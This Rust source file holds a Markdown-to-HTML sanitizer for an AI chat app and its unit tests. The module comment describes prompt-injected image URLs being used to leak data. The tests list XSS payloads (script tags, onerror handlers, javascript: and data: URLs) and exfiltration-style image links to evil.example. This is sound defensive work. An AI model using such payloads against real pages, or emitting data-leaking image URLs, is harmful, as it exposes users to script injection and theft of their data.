//! Streaming-safe Markdown → HTML for everything the app injects with
//! Leptos's `inner_html`: assistant messages and user-authored knowledge
//! documents.
//!
//! Neither source is trusted. An assistant reply can quote a web page, a
//! file or a tool result verbatim, so it can carry HTML or a `javascript:`
//! link someone else wrote. The renderer therefore drops raw HTML, and
//! renders a link or image whose URL scheme is not on the allowlist
//! ([`safe_url`]) as its plain text. A remote image (`http:`, `https:` or
//! protocol-relative) is rendered as a link to it, never as `<img>`: loading
//! it would send whatever a prompt injection put in its URL to that host with
//! no click, on every view. Only same-origin (relative) images load inline.
//! Code highlighting, KaTeX and Mermaid run afterwards on the sanitized DOM
//! (`components/render_pass.rs`).
//!
//! Streaming behavior: the fragment the model has emitted so far is
//! re-rendered on every signal tick. pulldown-cmark handles unclosed
//! constructs (fences, emphasis, links) by emitting the literal text rather
//! than synthesizing closers, so partial output doesn't break layout.

use pulldown_cmark::{html, Event, Options, Parser, Tag, TagEnd};

/// Render untrusted `markdown` to HTML using GFM extensions, without raw
/// HTML, without links or images to disallowed URL schemes, and with remote
/// images turned into links.
pub fn render_untrusted(markdown: &str) -> String {
    let mut opts = Options::empty();
    opts.insert(Options::ENABLE_TABLES);
    opts.insert(Options::ENABLE_STRIKETHROUGH);
    opts.insert(Options::ENABLE_TASKLISTS);
    opts.insert(Options::ENABLE_FOOTNOTES);
    opts.insert(Options::ENABLE_SMART_PUNCTUATION);

    let events = sanitize(Parser::new_ext(markdown, opts));
    let mut html_buf = String::with_capacity(markdown.len() + 64);
    html::push_html(&mut html_buf, events.into_iter());
    html_buf
}

/// How an open link or image was rendered, so its end tag matches.
#[derive(Clone, Copy)]
enum Rendered {
    /// Emitted as-is.
    Kept,
    /// Tags dropped; the text inside (a link's text, an image's alt) stays.
    Dropped,
    /// A remote image emitted as an `<a>` to its URL.
    AsLink,
}

/// Drop raw HTML and disallowed links / images, and turn remote images into
/// links.
fn sanitize<'a>(parser: impl Iterator<Item = Event<'a>>) -> Vec<Event<'a>> {
    let mut out = Vec::new();
    let mut links: Vec<Rendered> = Vec::new();
    let mut images: Vec<Rendered> = Vec::new();
    // Anchors currently open in the output; an `<a>` may not nest in another.
    let mut open_anchors = 0usize;
    let mut parser = parser.peekable();
    while let Some(event) = parser.next() {
        match event {
            Event::Html(_) | Event::InlineHtml(_) => {}
            Event::Start(Tag::Link { ref dest_url, .. }) => {
                if safe_url(dest_url).is_some() {
                    links.push(Rendered::Kept);
                    open_anchors += 1;
                    out.push(event);
                } else {
                    links.push(Rendered::Dropped);
                }
            }
            Event::End(TagEnd::Link) => {
                if !matches!(links.pop(), Some(Rendered::Dropped)) {
                    open_anchors = open_anchors.saturating_sub(1);
                    out.push(event);
                }
            }
            Event::Start(Tag::Image {
                link_type,
                dest_url,
                title,
                id,
            }) => match image_source(&dest_url) {
                ImageSource::SameOrigin => {
                    images.push(Rendered::Kept);
                    out.push(Event::Start(Tag::Image {
                        link_type,
                        dest_url,
                        title,
                        id,
                    }));
                }
                ImageSource::Remote if open_anchors == 0 => {
                    images.push(Rendered::AsLink);
                    open_anchors += 1;
                    let empty_alt = matches!(parser.peek(), Some(Event::End(TagEnd::Image)));
                    let url_text = empty_alt.then(|| dest_url.clone());
                    out.push(Event::Start(Tag::Link {
                        link_type,
                        dest_url,
                        title,
                        id,
                    }));
                    // An image without alt text still needs visible link text.
                    if let Some(url) = url_text {
                        out.push(Event::Text(url));
                    }
                }
                // Remote inside a link (no nested anchors) or disallowed.
                ImageSource::Remote | ImageSource::Disallowed => {
                    images.push(Rendered::Dropped);
                }
            },
            Event::End(TagEnd::Image) => match images.pop() {
                Some(Rendered::Dropped) => {}
                Some(Rendered::AsLink) => {
                    open_anchors = open_anchors.saturating_sub(1);
                    out.push(Event::End(TagEnd::Link));
                }
                Some(Rendered::Kept) | None => out.push(event),
            },
            other => out.push(other),
        }
    }
    out
}

/// Where an image URL would load from.
#[derive(Debug, PartialEq, Eq)]
enum ImageSource {
    /// A relative path or `#fragment` on the page's own origin.
    SameOrigin,
    /// An allowed scheme (`http:`, `https:`, `mailto:`) or a protocol-relative
    /// `//host` URL: another origin.
    Remote,
    /// A scheme [`safe_url`] refuses.
    Disallowed,
}

fn image_source(url: &str) -> ImageSource {
    if safe_url(url).is_none() {
        return ImageSource::Disallowed;
    }
    let normalized = normalize_url(url);
    let has_scheme = normalized
        .find([':', '/', '?', '#'])
        .is_some_and(|at| normalized[at..].starts_with(':'));
    // Browsers read `\` as `/` in http(s) URLs, so `\\host` and `/\host` are
    // protocol-relative too.
    let mut leading = normalized.chars();
    let protocol_relative =
        matches!(leading.next(), Some('/' | '\\')) && matches!(leading.next(), Some('/' | '\\'));
    if has_scheme || protocol_relative {
        ImageSource::Remote
    } else {
        ImageSource::SameOrigin
    }
}

/// `url` as a browser's URL parser reads it: leading and trailing C0 controls
/// and spaces ignored, tabs and newlines removed anywhere.
fn normalize_url(url: &str) -> String {
    url.trim_matches(|c: char| c <= ' ')
        .chars()
        .filter(|c| !matches!(c, '\t' | '\n' | '\r'))
        .collect()
}

/// `url` if a browser following it can only navigate or fetch — `http`,
/// `https`, `mailto`, a `#fragment`, or a relative / protocol-relative path —
/// and `None` for any other scheme (`javascript:`, `data:`, `vbscript:`,
/// `file:`, …).
///
/// The scheme is read the way the URL parser in a browser reads it: leading
/// and trailing C0 controls and spaces are ignored and tabs and newlines are
/// removed anywhere, so `"\tjava\nscript:"` is still `javascript:`.
pub fn safe_url(url: &str) -> Option<&str> {
    let normalized = normalize_url(url);
    let scheme_end = normalized.find([':', '/', '?', '#']);
    match scheme_end {
        // A colon before any path, query or fragment delimiter ends a scheme.
        Some(at) if normalized[at..].starts_with(':') => {
            let scheme = normalized[..at].to_ascii_lowercase();
            matches!(scheme.as_str(), "http" | "https" | "mailto").then_some(url)
        }
        // No scheme: relative path, `//host` or `#fragment`.
        _ => Some(url),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn untrusted_markdown_drops_raw_html_but_keeps_markdown() {
        let rendered = render_untrusted("# Safe\n<script>alert(1)</script>\n**strong**");
        assert!(!rendered.contains("script"));
        assert!(rendered.contains("<h1>Safe</h1>"));
        assert!(rendered.contains("<strong>strong</strong>"));
    }

    /// Assistant replies go through the same renderer; HTML the model
    /// echoes (from a web page, a file, a tool result) never reaches the DOM.
    #[test]
    fn assistant_markdown_cannot_inject_elements_or_handlers() {
        for markdown in [
            "look: <img src=x onerror=alert(1)>",
            "<img src=x onerror=alert(1)>",
            "<script>alert(1)</script>",
            "text\n\n<script>\nalert(1)\n</script>\n",
            "<div onclick=\"alert(1)\">hi</div>",
            "a <svg onload=alert(1)> b",
        ] {
            let html = render_untrusted(markdown);
            for needle in ["<img", "onerror", "<script", "onclick", "<svg", "onload"] {
                assert!(!html.contains(needle), "{markdown:?} rendered {html:?}");
            }
        }
    }

    #[test]
    fn dangerous_link_schemes_are_rejected() {
        for url in [
            "javascript:alert(1)",
            "JaVaScRiPt:alert(1)",
            "\tjavascript:alert(1)",
            " javascript:alert(1)",
            "java\nscript:alert(1)",
            "jav\tascript:alert(1)",
            "\u{1}javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "DATA:image/svg+xml;base64,AAAA",
            "vbscript:msgbox(1)",
            "file:///etc/passwd",
        ] {
            assert_eq!(safe_url(url), None, "{url:?}");
        }
    }

    #[test]
    fn web_mail_fragment_and_relative_links_are_kept() {
        for url in [
            "https://example.com/a?b#c",
            "HTTP://example.com",
            "mailto:me@example.com",
            "#section",
            "/docs/a.md",
            "docs/a.md",
            "./a:b",
            "?q=1",
            "//example.com/x",
            "me@example.com",
        ] {
            assert_eq!(safe_url(url), Some(url), "{url:?}");
        }
    }

    #[test]
    fn disallowed_links_and_images_render_as_their_text() {
        for markdown in [
            "[click](javascript:alert(1))",
            "[click](JaVaScRiPt:alert(1))",
            "[click](<\tjavascript:alert(1)>)",
            "[click](javascript&#58;alert(1))",
            "[click](vbscript:msgbox(1))",
            "<javascript:alert(1)>",
            "[click][r]\n\n[r]: javascript:alert(1)",
        ] {
            let html = render_untrusted(markdown);
            assert!(!html.contains("<a"), "{markdown:?} rendered {html:?}");
            assert!(!html.contains("href"), "{markdown:?} rendered {html:?}");
        }
        let html = render_untrusted("![alt text](data:image/svg+xml;base64,AAAA)");
        assert!(!html.contains("<img"), "{html}");
        assert!(html.contains("alt text"), "{html}");
        assert_eq!(
            render_untrusted("[a](javascript:x) [b](https://example.com)"),
            "<p>a <a href=\"https://example.com\">b</a></p>\n"
        );
    }

    #[test]
    fn allowed_links_same_origin_images_and_autolinks_render() {
        let html = render_untrusted(
            "[web](https://example.com) ![pic](/assets/a.png) <https://example.com/auto> <me@example.com> [here](#notes)",
        );
        assert!(
            html.contains("<a href=\"https://example.com\">web</a>"),
            "{html}"
        );
        assert!(
            html.contains("<img src=\"/assets/a.png\" alt=\"pic\""),
            "{html}"
        );
        assert!(html.contains("href=\"https://example.com/auto\""), "{html}");
        assert!(html.contains("href=\"mailto:me@example.com\""), "{html}");
        assert!(html.contains("href=\"#notes\""), "{html}");
    }

    /// A remote image would load with no click on every view, sending
    /// whatever a prompt injection put in its URL to that host. It renders
    /// as a link instead.
    #[test]
    fn remote_images_render_as_links_never_img() {
        for (markdown, link) in [
            (
                "![secret](https://evil.example/?d=s3cr3t)",
                "<a href=\"https://evil.example/?d=s3cr3t\">secret</a>",
            ),
            (
                "![pic](HTTP://evil.example/a.png)",
                "<a href=\"HTTP://evil.example/a.png\">pic</a>",
            ),
            (
                "![pic](//evil.example/a.png)",
                "<a href=\"//evil.example/a.png\">pic</a>",
            ),
            (
                "![pic](/\\evil.example/a.png)",
                "<a href=\"/%5Cevil.example/a.png\">pic</a>",
            ),
            (
                "![pic][r]\n\n[r]: https://evil.example/r.png",
                "<a href=\"https://evil.example/r.png\">pic</a>",
            ),
            (
                "![](https://evil.example/?d=x)",
                "<a href=\"https://evil.example/?d=x\">https://evil.example/?d=x</a>",
            ),
        ] {
            let html = render_untrusted(markdown);
            assert!(!html.contains("<img"), "{markdown:?} rendered {html:?}");
            assert!(html.contains(link), "{markdown:?} rendered {html:?}");
        }
        assert_eq!(
            render_untrusted("see ![a *b*](https://e.example/x.png \"t\") end"),
            "<p>see <a href=\"https://e.example/x.png\" title=\"t\">a <em>b</em></a> end</p>\n"
        );
    }

    #[test]
    fn image_sources_are_classified_by_origin() {
        for url in ["a.png", "/a.png", "./a:b.png", "#x", "?q=1"] {
            assert_eq!(image_source(url), ImageSource::SameOrigin, "{url:?}");
        }
        for url in [
            "https://e.example/a.png",
            "http:a.png",
            " https://e.example",
            "//e.example/a.png",
            "\\\\e.example/a.png",
            "/\\e.example/a.png",
            "\t//e.example/a.png",
            "mailto:me@example.com",
        ] {
            assert_eq!(image_source(url), ImageSource::Remote, "{url:?}");
        }
        for url in [
            "javascript:x",
            "data:image/png;base64,AAAA",
            "file:///a.png",
        ] {
            assert_eq!(image_source(url), ImageSource::Disallowed, "{url:?}");
        }
    }

    #[test]
    fn a_same_origin_image_inside_a_dropped_link_survives() {
        let html = render_untrusted("[![pic](/a.png)](javascript:x)");
        assert!(!html.contains("javascript"), "{html}");
        assert!(html.contains("<img src=\"/a.png\""), "{html}");
    }

    #[test]
    fn a_remote_image_inside_a_dropped_link_becomes_its_own_link() {
        assert_eq!(
            render_untrusted("[![pic](https://e.example/a.png)](javascript:x)"),
            "<p><a href=\"https://e.example/a.png\">pic</a></p>\n"
        );
    }

    /// An `<a>` cannot nest in another, so a remote image inside a kept link
    /// keeps only its alt text; the outer link still leads somewhere.
    #[test]
    fn a_remote_image_inside_a_kept_link_renders_as_its_alt_text() {
        assert_eq!(
            render_untrusted("[![pic](https://e.example/a.png)](https://e.example/page) after"),
            "<p><a href=\"https://e.example/page\">pic</a> after</p>\n"
        );
        assert_eq!(
            render_untrusted("[x ![p](/a.png) y](https://e.example/)"),
            "<p><a href=\"https://e.example/\">x <img src=\"/a.png\" alt=\"p\" /> y</a></p>\n"
        );
    }
}
